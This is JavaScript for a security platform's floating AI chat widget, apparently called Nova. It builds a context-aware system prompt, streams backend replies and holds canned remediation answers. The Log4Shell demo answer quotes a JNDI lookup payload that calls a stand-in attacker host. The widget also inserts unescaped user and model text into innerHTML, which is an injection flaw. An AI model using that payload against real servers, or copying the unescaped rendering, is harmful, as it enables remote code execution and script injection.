/**
 * SENTINEL — Floating AI Assistant Orb
 * Include this script on any page.
 * Set window.SENTINEL_CONTEXT = { page, target, findings, ... } for context-aware answers.
 */

(function () {
  const BACKEND = (typeof SENTINEL_CONFIG !== 'undefined') ? SENTINEL_CONFIG.BACKEND : 'http://localhost:8000';

  // ═══════════════════════════════════════════════════════
  // INJECT STYLES
  // ═══════════════════════════════════════════════════════
  const style = document.createElement('style');
  style.textContent = `
    /* ── Orb button ─────────────────────────────── */
    #sentinel-orb-wrap {
      position: fixed;
      bottom: 32px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 10000;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      user-select: none;
    }
    #sentinel-orb-canvas {
      width: 76px;
      height: 76px;
      border-radius: 50%;
      transition: transform 0.3s cubic-bezier(0.34,1.56,0.64,1), filter 0.3s;
      filter: drop-shadow(0 0 18px rgba(100,200,255,0.35));
    }
    #sentinel-orb-wrap:hover #sentinel-orb-canvas {
      transform: scale(1.12);
      filter: drop-shadow(0 0 28px rgba(100,200,255,0.6));
    }
    #sentinel-orb-wrap:hover #sentinel-orb-label {
      opacity: 1;
    }
    #sentinel-orb-label {
      font-family: 'Inter', sans-serif;
      font-size: 8px;
      letter-spacing: 5px;
      text-transform: uppercase;
      color: rgba(100, 200, 255, 0.6);
      opacity: 0;
      transition: opacity 0.3s;
      white-space: nowrap;
    }

    /* ── Nova speech bubble ─────────────────────── */
    #nova-bubble {
      position: fixed;
      bottom: 108px;
      left: 50%;
      transform: translateX(14px);
      width: 210px;
      padding: 11px 14px 11px 13px;
      background: rgba(8, 12, 20, 0.72);
      border: 1px solid rgba(100, 200, 255, 0.18);
      backdrop-filter: blur(18px);
      border-radius: 10px 10px 10px 2px;
      z-index: 10001;
      pointer-events: none;
      opacity: 0;
      transform: translateX(14px) translateY(6px) scale(0.95);
      transform-origin: bottom left;
      transition: opacity 0.25s ease, transform 0.3s cubic-bezier(0.34,1.56,0.64,1);
    }
    #nova-bubble.show {
      opacity: 1;
      transform: translateX(14px) translateY(0) scale(1);
    }
    /* Tail — points down-left toward orb */
    #nova-bubble::after {
      content: '';
      position: absolute;
      bottom: -6px;
      left: 14px;
      width: 10px;
      height: 10px;
      background: rgba(8, 12, 20, 0.72);
      border-right: 1px solid rgba(100, 200, 255, 0.18);
      border-bottom: 1px solid rgba(100, 200, 255, 0.18);
      transform: rotate(45deg);
    }
    #nova-bubble-prefix {
      font-family: 'Inter', sans-serif;
      font-size: 8px;
      letter-spacing: 3px;
      text-transform: uppercase;
      color: rgba(100, 200, 255, 0.4);
      display: block;
      margin-bottom: 5px;
    }
    #nova-bubble-text {
      font-family: 'Inter', sans-serif;
      font-size: 11px;
      font-weight: 300;
      color: rgba(255, 255, 255, 0.7);
      line-height: 1.55;
      min-height: 34px;
    }
    #nova-bubble-cursor {
      display: inline-block;
      width: 1.5px;
      height: 11px;
      background: rgba(100, 200, 255, 0.6);
      vertical-align: middle;
      margin-left: 1px;
      animation: nova-cur 0.75s step-end infinite;
    }
    @keyframes nova-cur { 0%,100%{opacity:1} 50%{opacity:0} }

    /* ── Chat panel ─────────────────────────────── */
    #sentinel-chat-panel {
      position: fixed;
      bottom: 130px;
      left: 50%;
      transform: translateX(-50%) translateY(20px);
      width: 420px;
      max-height: 520px;
      background: rgba(8, 10, 14, 0.97);
      border: 1px solid rgba(100, 200, 255, 0.18);
      box-shadow: 0 0 60px rgba(60, 140, 255, 0.12), 0 20px 60px rgba(0,0,0,0.5);
      backdrop-filter: blur(24px);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.35s ease, transform 0.35s cubic-bezier(0.34,1.56,0.64,1);
      overflow: hidden;
    }
    #sentinel-chat-panel.open {
      opacity: 1;
      pointer-events: all;
      transform: translateX(-50%) translateY(0);
    }

    .sc-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 18px;
      border-bottom: 1px solid rgba(100,200,255,0.1);
      flex-shrink: 0;
    }
    .sc-header-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .sc-header-dot {
      width: 7px; height: 7px; border-radius: 50%;
      background: #4da6ff;
      box-shadow: 0 0 8px #4da6ff;
      animation: sc-pulse 2s ease-in-out infinite;
    }
    @keyframes sc-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
    .sc-header-title {
      font-family: 'Inter', sans-serif;
      font-size: 9px;
      letter-spacing: 5px;
      text-transform: uppercase;
      color: rgba(100,200,255,0.7);
    }
    .sc-close-btn {
      background: none; border: none; cursor: pointer;
      color: rgba(255,255,255,0.25); font-size: 14px;
      line-height: 1; padding: 2px; transition: color 0.2s;
      font-family: monospace;
    }
    .sc-close-btn:hover { color: rgba(255,255,255,0.7); }

    .sc-context-bar {
      padding: 7px 18px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 9px;
      color: rgba(77,166,255,0.4);
      border-bottom: 1px solid rgba(100,200,255,0.06);
      letter-spacing: 1px;
      flex-shrink: 0;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .sc-messages {
      flex: 1;
      overflow-y: auto;
      padding: 16px 18px;
      display: flex;
      flex-direction: column;
      gap: 14px;
      min-height: 200px;
      max-height: 340px;
    }
    .sc-messages::-webkit-scrollbar { width: 3px; }
    .sc-messages::-webkit-scrollbar-thumb { background: rgba(77,166,255,0.2); }

    .sc-msg {
      display: flex;
      flex-direction: column;
      gap: 4px;
      animation: sc-msg-in 0.3s ease;
    }
    @keyframes sc-msg-in { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:none} }

    .sc-msg-role {
      font-family: 'Inter', sans-serif;
      font-size: 8px;
      letter-spacing: 3px;
      text-transform: uppercase;
    }
    .sc-msg.user .sc-msg-role { color: rgba(77,166,255,0.5); }
    .sc-msg.ai   .sc-msg-role { color: rgba(100,200,255,0.35); }

    .sc-msg-text {
      font-family: 'Inter', sans-serif;
      font-size: 12px;
      line-height: 1.75;
      font-weight: 300;
    }
    .sc-msg.user .sc-msg-text {
      color: rgba(255,255,255,0.8);
      background: rgba(77,166,255,0.06);
      border: 1px solid rgba(77,166,255,0.12);
      padding: 10px 14px;
    }
    .sc-msg.ai .sc-msg-text {
      color: rgba(255,255,255,0.65);
    }
    .sc-msg.ai .sc-msg-text code {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      background: rgba(77,166,255,0.08);
      border: 1px solid rgba(77,166,255,0.15);
      padding: 1px 6px;
      color: #4da6ff;
    }
    .sc-msg.ai .sc-msg-text pre {
      background: rgba(0,0,0,0.4);
      border: 1px solid rgba(77,166,255,0.15);
      padding: 12px 14px;
      margin: 8px 0;
      overflow-x: auto;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      color: rgba(255,255,255,0.7);
      line-height: 1.6;
    }

    .sc-thinking {
      display: flex; align-items: center; gap: 5px;
      padding: 4px 0;
    }
    .sc-thinking span {
      width: 5px; height: 5px; border-radius: 50%;
      background: rgba(77,166,255,0.5);
      animation: sc-think 1.2s ease-in-out infinite;
    }
    .sc-thinking span:nth-child(2) { animation-delay: 0.2s; }
    .sc-thinking span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes sc-think { 0%,100%{transform:scale(0.7);opacity:0.3} 50%{transform:scale(1.2);opacity:1} }

    .sc-suggestions {
      display: flex; flex-wrap: wrap; gap: 6px;
      padding: 0 18px 12px;
      flex-shrink: 0;
    }
    .sc-suggestion {
      font-family: 'Inter', sans-serif;
      font-size: 9px; letter-spacing: 1px;
      color: rgba(77,166,255,0.55);
      border: 1px solid rgba(77,166,255,0.15);
      padding: 5px 10px;
      cursor: pointer;
      background: transparent;
      transition: all 0.2s;
    }
    .sc-suggestion:hover {
      background: rgba(77,166,255,0.08);
      color: rgba(77,166,255,0.9);
      border-color: rgba(77,166,255,0.35);
    }

    .sc-input-row {
      display: flex;
      border-top: 1px solid rgba(100,200,255,0.1);
      flex-shrink: 0;
    }
    #sentinel-chat-input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      padding: 14px 16px;
      font-family: 'Inter', sans-serif;
      font-size: 12px;
      font-weight: 300;
      color: rgba(255,255,255,0.85);
    }
    #sentinel-chat-input::placeholder {
      color: rgba(255,255,255,0.18);
    }
    #sentinel-send-btn {
      background: none;
      border: none;
      border-left: 1px solid rgba(100,200,255,0.1);
      padding: 0 18px;
      color: rgba(77,166,255,0.5);
      font-size: 16px;
      cursor: pointer;
      transition: color 0.2s;
    }
    #sentinel-send-btn:hover { color: rgba(77,166,255,0.9); }
    #sentinel-send-btn:disabled { opacity: 0.3; cursor: not-allowed; }
  `;
  document.head.appendChild(style);

  // ═══════════════════════════════════════════════════════
  // BUILD DOM
  // ═══════════════════════════════════════════════════════
  // Speech bubble
  const novaBubble = document.createElement('div');
  novaBubble.id = 'nova-bubble';
  novaBubble.innerHTML = `
    <span id="nova-bubble-prefix">Nova</span>
    <span id="nova-bubble-text"><span id="nova-bubble-cursor"></span></span>
  `;
  document.body.appendChild(novaBubble);

  const orbWrap = document.createElement('div');
  orbWrap.id = 'sentinel-orb-wrap';
  orbWrap.innerHTML = `
    <canvas id="sentinel-orb-canvas" width="152" height="152"></canvas>
    <span id="sentinel-orb-label">Ask Nova</span>
  `;

  const chatPanel = document.createElement('div');
  chatPanel.id = 'sentinel-chat-panel';
  chatPanel.innerHTML = `
    <div class="sc-header">
      <div class="sc-header-left">
        <div class="sc-header-dot"></div>
        <span class="sc-header-title">Nova</span>
      </div>
      <button class="sc-close-btn" id="sc-close">✕</button>
    </div>
    <div class="sc-context-bar" id="sc-context-bar">Security assistant — ask about vulnerabilities, fixes, and best practices</div>
    <div class="sc-messages" id="sc-messages"></div>
    <div class="sc-suggestions" id="sc-suggestions"></div>
    <div class="sc-input-row">
      <input id="sentinel-chat-input" placeholder="Ask about a vulnerability, fix, or best practice…" autocomplete="off" />
      <button id="sentinel-send-btn">↑</button>
    </div>
  `;

  document.body.appendChild(chatPanel);
  document.body.appendChild(orbWrap);

  // ═══════════════════════════════════════════════════════
  // PARTICLE SPHERE
  // ═══════════════════════════════════════════════════════
  const canvas = document.getElementById('sentinel-orb-canvas');
  const ctx2d  = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const CX = W / 2, CY = H / 2;
  const R  = W * 0.36;

  // Build particles: grid on sphere with wave deformation
  const particles = [];
  const ROWS = 28, COLS = 52;

  for (let row = 0; row <= ROWS; row++) {
    const theta = (row / ROWS) * Math.PI;
    for (let col = 0; col < COLS; col++) {
      const phi = (col / COLS) * Math.PI * 2;
      const waveSeed = Math.random() * Math.PI * 2;
      const baseSize = row === 0 || row === ROWS ? 1.2 : 0.9 + Math.random() * 1.0;
      particles.push({ theta, phi, waveSeed, baseSize,
        waveAmp: 0.10 + Math.random() * 0.14,
        waveFreq: 2 + Math.floor(Math.random() * 4),
        waveSpeed: 0.25 + Math.random() * 0.4,
        phase2: Math.random() * Math.PI * 2,
      });
    }
  }

  // Smoke particles (outer haze)
  for (let i = 0; i < 180; i++) {
    const theta = Math.acos(2 * Math.random() - 1);
    const phi   = Math.random() * Math.PI * 2;
    particles.push({ theta, phi,
      waveSeed: Math.random() * Math.PI * 2,
      baseSize: 0.7 + Math.random() * 1.1,
      waveAmp:  0.18 + Math.random() * 0.22,
      waveFreq: 1 + Math.random() * 3,
      waveSpeed:0.1 + Math.random() * 0.25,
      phase2:   Math.random() * Math.PI * 2,
      isSmoke: true,
    });
  }

  let orbTime = 0;
  let orbRotY = 0;

  function renderOrb() {
    orbTime  += 0.012;
    orbRotY  += 0.004;

    ctx2d.clearRect(0, 0, W, H);

    // Soft core glow
    const grd = ctx2d.createRadialGradient(CX, CY, 0, CX, CY, R * 0.85);
    grd.addColorStop(0,   'rgba(80,160,255,0.12)');
    grd.addColorStop(0.5, 'rgba(40,100,255,0.06)');
    grd.addColorStop(1,   'rgba(0,0,0,0)');
    ctx2d.fillStyle = grd;
    ctx2d.fillRect(0, 0, W, H);

    // Project and collect
    const pts = particles.map(p => {
      const wave = p.waveAmp * (
        Math.sin(p.waveFreq * p.phi + orbTime * p.waveSpeed + p.waveSeed) *
        Math.sin(p.waveFreq * 0.7 * p.theta + orbTime * p.waveSpeed * 0.6 + p.phase2)
      );

      const r = R * (1 + wave);
      const ph = p.phi + orbRotY;

      // 3D → 2D with slight tilt
      const sinT = Math.sin(p.theta), cosT = Math.cos(p.theta);
      const sinP = Math.sin(ph),      cosP = Math.cos(ph);

      let x3 = r * sinT * cosP;
      let y3 = r * cosT;
      let z3 = r * sinT * sinP;

      // Tilt 15°
      const tilt = 0.26;
      const y3t  = y3 * Math.cos(tilt) - z3 * Math.sin(tilt);
      const z3t  = y3 * Math.sin(tilt) + z3 * Math.cos(tilt);
      y3 = y3t; z3 = z3t;

      const depth  = (z3 + R) / (2 * R); // 0 = back, 1 = front
      const bright = depth * 0.85 + 0.15;

      return {
        sx: CX + x3,
        sy: CY + y3 * 0.92,
        z3,
        depth,
        size: p.baseSize * (p.isSmoke ? 0.85 : 1.0),
        bright,
        isSmoke: !!p.isSmoke,
      };
    });

    // Back to front
    pts.sort((a, b) => a.z3 - b.z3);

    pts.forEach(pt => {
      if (pt.isSmoke) {
        const edgeness = 1 - Math.abs(pt.depth - 0.5) * 1.8;
        if (edgeness <= 0) return;
        ctx2d.beginPath();
        ctx2d.arc(pt.sx, pt.sy, pt.size, 0, Math.PI * 2);
        ctx2d.fillStyle = `rgba(120,210,255,${edgeness * 0.18 * pt.bright})`;
        ctx2d.fill();
        return;
      }

      const alpha = 0.25 + pt.bright * 0.75;
      const r = Math.floor(140 + pt.bright * 115);
      const g = Math.floor(210 + pt.bright * 45);

      ctx2d.beginPath();
      ctx2d.arc(pt.sx, pt.sy, pt.size * (0.6 + pt.depth * 0.7), 0, Math.PI * 2);
      ctx2d.fillStyle = `rgba(${r},${g},255,${alpha})`;
      ctx2d.fill();

      // Bright rim highlight
      if (pt.depth > 0.82) {
        ctx2d.beginPath();
        ctx2d.arc(pt.sx, pt.sy, pt.size * 0.4, 0, Math.PI * 2);
        ctx2d.fillStyle = `rgba(220,240,255,${(pt.depth - 0.82) * 5})`;
        ctx2d.fill();
      }
    });

    requestAnimationFrame(renderOrb);
  }
  renderOrb();

  // ═══════════════════════════════════════════════════════
  // CHAT LOGIC
  // ═══════════════════════════════════════════════════════
  let chatOpen    = false;
  let isStreaming = false;
  const messages  = [];

  function getContext() {
    const ctx = window.SENTINEL_CONTEXT || {};
    return ctx;
  }

  function getContextBar() {
    const ctx = getContext();
    if (ctx.target)    return `Scanning: ${ctx.target}  ·  Module: ${ctx.page || 'home'}`;
    if (ctx.page)      return `Module: ${ctx.page}  ·  Security assistant`;
    return 'Security assistant — ask about vulnerabilities, fixes, and best practices';
  }

  function getSystemPrompt() {
    const ctx = getContext();
    let sys = `You are SENTINEL, an expert AI security analyst built into the SENTINEL security platform. You give direct, specific, and actionable security advice.

Current module: ${ctx.page || 'home'}`;

    if (ctx.target)     sys += `\nActive scan target: ${ctx.target}`;
    if (ctx.riskScore)  sys += `\nRisk score: ${ctx.riskScore}/100`;
    if (ctx.findings)   sys += `\nFindings summary: ${JSON.stringify(ctx.findings)}`;
    if (ctx.scanData)   sys += `\nScan data (abbreviated): ${JSON.stringify(ctx.scanData).slice(0, 800)}`;

    sys += `

Your style:
- Be direct and technical. No filler phrases.
- Always give concrete, runnable examples (commands, code, config snippets).
- When referencing a finding from the scan data, be specific about it.
- Prioritize fixes by severity — tell the user what to fix first.
- Format code in markdown code blocks with the language specified.
- Keep responses focused and under 250 words unless a detailed walkthrough is genuinely needed.`;

    return sys;
  }

  function getSuggestions() {
    const ctx = getContext();
    const page = ctx.page || 'home';
    const suggestions = {
      home:    ['What is an attack surface?', 'Which module should I start with?', 'How do CVE scores work?'],
      asm:     ['Explain my risk score', 'What should I fix first?', 'How do I add HSTS?', 'What do open ports mean?'],
      secrets: ['How do I rotate an AWS key?', 'How do I prevent secrets in git?', 'What is a pre-commit hook?'],
      cve:     ['How do I upgrade safely?', 'What is CVSS?', 'Explain Log4Shell', 'How do I set up Dependabot?'],
      email:   ['What is DMARC?', 'How do I fix SPF?', 'Why does DKIM matter?'],
      phishing:['What is typosquatting?', 'How do I protect my brand?'],
    };
    return suggestions[page] || suggestions.home;
  }

  function renderSuggestions() {
    const wrap = document.getElementById('sc-suggestions');
    wrap.innerHTML = '';
    if (messages.length > 0) return; // hide after first message
    getSuggestions().forEach(s => {
      const btn = document.createElement('button');
      btn.className = 'sc-suggestion';
      btn.textContent = s;
      btn.onclick = () => sendMessage(s);
      wrap.appendChild(btn);
    });
  }

  function openChat() {
    chatOpen = true;
    chatPanel.classList.add('open');
    document.getElementById('sc-context-bar').textContent = getContextBar();
    renderSuggestions();
    setTimeout(() => document.getElementById('sentinel-chat-input').focus(), 350);
  }

  function closeChat() {
    chatOpen = false;
    chatPanel.classList.remove('open');
  }

  function appendMessage(role, text) {
    messages.push({ role, text });
    const list = document.getElementById('sc-messages');

    const msgEl = document.createElement('div');
    msgEl.className = `sc-msg ${role}`;
    msgEl.innerHTML = `
      <span class="sc-msg-role">${role === 'user' ? 'You' : 'Nova'}</span>
      <div class="sc-msg-text">${formatText(text)}</div>
    `;
    list.appendChild(msgEl);
    list.scrollTop = list.scrollHeight;
    document.getElementById('sc-suggestions').innerHTML = '';
    return msgEl;
  }

  function formatText(text) {
    // Code blocks
    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, (_, lang, code) =>
      `<pre><code>${code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></pre>`);
    // Inline code
    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
    // Bold
    text = text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
    // Newlines
    text = text.replace(/\n/g, '<br>');
    return text;
  }

  function addThinking() {
    const list = document.getElementById('sc-messages');
    const el = document.createElement('div');
    el.className = 'sc-msg ai';
    el.id = 'sc-thinking';
    el.innerHTML = `
      <span class="sc-msg-role">Sentinel AI</span>
      <div class="sc-thinking"><span></span><span></span><span></span></div>
    `;
    list.appendChild(el);
    list.scrollTop = list.scrollHeight;
  }

  function removeThinking() {
    const el = document.getElementById('sc-thinking');
    if (el) el.remove();
  }

  async function sendMessage(text) {
    if (isStreaming) return;
    const input = document.getElementById('sentinel-chat-input');
    const msg   = text || input.value.trim();
    if (!msg) return;

    input.value = '';
    document.getElementById('sentinel-send-btn').disabled = true;
    isStreaming = true;

    appendMessage('user', msg);
    addThinking();

    const history = messages.slice(-8).map(m => ({
      role:    m.role === 'user' ? 'user' : 'assistant',
      content: m.text,
    }));

    try {
      const res = await fetch(`${BACKEND}/ai/chat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message:  msg,
          history:  history.slice(0, -1), // exclude the just-sent message
          system:   getSystemPrompt(),
        }),
      });

      removeThinking();

      if (!res.ok) throw new Error('Backend unavailable');

      // Streaming
      const list = document.getElementById('sc-messages');
      const msgEl = document.createElement('div');
      msgEl.className = 'sc-msg ai';
      msgEl.innerHTML = `<span class="sc-msg-role">Nova</span><div class="sc-msg-text" id="sc-stream-text"></div>`;
      list.appendChild(msgEl);

      const streamEl = document.getElementById('sc-stream-text');
      const reader   = res.body.getReader();
      const decoder  = new TextDecoder();
      let fullText   = '';

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        fullText += decoder.decode(value, { stream: true });
        streamEl.innerHTML = formatText(fullText) + '<span style="display:inline-block;width:1px;height:13px;background:rgba(77,166,255,.7);vertical-align:middle;animation:sc-blink .7s step-end infinite;margin-left:1px"></span>';
        list.scrollTop = list.scrollHeight;
      }
      streamEl.innerHTML = formatText(fullText);
      messages.push({ role: 'ai', text: fullText });

    } catch (e) {
      removeThinking();
      // Fallback demo response
      const fallback = getDemoResponse(msg);
      appendMessage('ai', fallback);
    }

    isStreaming = false;
    document.getElementById('sentinel-send-btn').disabled = false;
    document.getElementById('sentinel-chat-input').focus();
  }

  function getDemoResponse(msg) {
    const m = msg.toLowerCase();
    if (m.includes('hsts') || m.includes('strict-transport'))
      return "**HSTS (HTTP Strict Transport Security)** tells browsers to only connect over HTTPS — ever.\n\nAdd this response header on your server:\n```nginx\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n```\nOr in Express:\n```js\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  next();\n});\n```\nThe `preload` flag submits your domain to browser HSTS preload lists — strongest protection.";
    if (m.includes('csp') || m.includes('content-security'))
      return "**Content-Security-Policy** prevents XSS by whitelisting where scripts, styles, and resources can load from.\n\nStart with a restrictive policy:\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';\n```\nTest in report-only mode first to avoid breaking things:\n```http\nContent-Security-Policy-Report-Only: default-src 'self';\n```";
    if (m.includes('aws') || m.includes('rotate'))
      return "To rotate an exposed AWS key immediately:\n\n1. **Go to IAM console** → Users → Security credentials\n2. **Create a new access key** first (before deleting the old one)\n3. **Update all services/env vars** using the old key\n4. **Deactivate** the old key, monitor CloudTrail for any usage, then **delete** it\n\nAlso run: `aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=YOUR_USER` to check if the key was used by anyone else.";
    if (m.includes('sql') || m.includes('injection'))
      return "**SQL injection** happens when user input is concatenated directly into queries.\n\nNever do this:\n```python\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n```\nAlways use parameterized queries:\n```python\n# SQLAlchemy\nresult = db.execute(text('SELECT * FROM users WHERE id = :id'), {'id': user_id})\n# Or raw psycopg2\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n```";
    if (m.includes('risk score') || m.includes('score'))
      return "The risk score is calculated from weighted findings:\n- **Critical finding**: +25 points\n- **High finding**: +15 points  \n- **Medium finding**: +8 points\n- **Low finding**: +3 points\n\nScore ranges: 0–30 = Low, 31–60 = Medium, 61–80 = High, 81–100 = Critical.\n\nFocus on eliminating your Critical findings first — one critical issue (like an exposed database port or expired SSL) has more impact than ten low-severity ones.";
    if (m.includes('log4') || m.includes('log4shell'))
      return "**Log4Shell (CVE-2021-44228)** is a critical RCE in Log4j 2.0–2.14.1. Attackers send a JNDI lookup string like `${jndi:ldap://attacker.com/a}` in any logged field — user-agent, username, etc. — and the server fetches and executes malicious code.\n\n**Fix**: Upgrade to Log4j **2.17.1+**\n```xml\n<!-- pom.xml -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>\n```\nIf you can't upgrade: set `log4j2.formatMsgNoLookups=true` as a JVM flag as a stopgap.";
    return "I'm in demo mode — the backend isn't running. Start the backend with `./start.sh` and set your `ANTHROPIC_API_KEY` to get live AI responses tailored to your scan data.\n\nIn the meantime, try asking about: HSTS, CSP, SQL injection, AWS key rotation, Log4Shell, or your risk score.";
  }

  // Inject keyframe for cursor blink
  const blink = document.createElement('style');
  blink.textContent = '@keyframes sc-blink{0%,100%{opacity:1}50%{opacity:0}}';
  document.head.appendChild(blink);

  // ═══════════════════════════════════════════════════════
  // NOVA SPEECH BUBBLE — hover typewriter
  // ═══════════════════════════════════════════════════════
  const BUBBLE_LINES = [
    "Ask NOVA for commands on how to fix certain issues",
    "Ask NOVA to explain what your risk score means",
    "Ask NOVA how to prevent secrets from leaking into git",
    "Ask NOVA to prioritize which CVEs to patch first",
    "Ask NOVA for step-by-step remediation guides",
    "Ask NOVA to write a secure nginx config for you",
    "Ask NOVA why a specific port is dangerous to expose",
    "Ask NOVA how to set up automated dependency scanning",
  ];

  let bubbleTimer    = null;
  let typeTimer      = null;
  let bubbleLineIdx  = 0;
  let bubbleActive   = false;

  function typeBubbleLine(text, onDone) {
    const el = document.getElementById('nova-bubble-text');
    if (!el) return;
    let i = 0;
    el.innerHTML = '<span id="nova-bubble-cursor"></span>';

    typeTimer = setInterval(() => {
      if (!bubbleActive) { clearInterval(typeTimer); return; }
      i += 2;
      const shown = text.slice(0, i);
      el.innerHTML = shown + '<span id="nova-bubble-cursor"></span>';
      if (i >= text.length) {
        clearInterval(typeTimer);
        el.innerHTML = text + '<span id="nova-bubble-cursor"></span>';
        if (onDone) setTimeout(() => { if (bubbleActive) onDone(); }, 2200);
      }
    }, 28);
  }

  function cycleBubble() {
    if (!bubbleActive) return;
    typeBubbleLine(BUBBLE_LINES[bubbleLineIdx % BUBBLE_LINES.length], () => {
      bubbleLineIdx++;
      cycleBubble();
    });
  }

  function showBubble() {
    if (chatOpen) return;
    bubbleActive = true;
    novaBubble.classList.add('show');
    cycleBubble();
  }

  function hideBubble() {
    bubbleActive = false;
    clearInterval(typeTimer);
    clearTimeout(bubbleTimer);
    novaBubble.classList.remove('show');
    const el = document.getElementById('nova-bubble-text');
    if (el) el.innerHTML = '<span id="nova-bubble-cursor"></span>';
  }

  orbWrap.addEventListener('mouseenter', () => {
    bubbleTimer = setTimeout(showBubble, 180);
  });
  orbWrap.addEventListener('mouseleave', () => {
    clearTimeout(bubbleTimer);
    hideBubble();
  });

  // ═══════════════════════════════════════════════════════
  // EVENT LISTENERS
  // ═══════════════════════════════════════════════════════
  orbWrap.addEventListener('click', () => { hideBubble(); chatOpen ? closeChat() : openChat(); });
  document.getElementById('sc-close').addEventListener('click', e => { e.stopPropagation(); closeChat(); });
  document.getElementById('sentinel-send-btn').addEventListener('click', () => sendMessage());
  document.getElementById('sentinel-chat-input').addEventListener('keydown', e => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); }
  });

  // Close on outside click
  document.addEventListener('click', e => {
    if (chatOpen && !chatPanel.contains(e.target) && !orbWrap.contains(e.target)) closeChat();
  });

})();
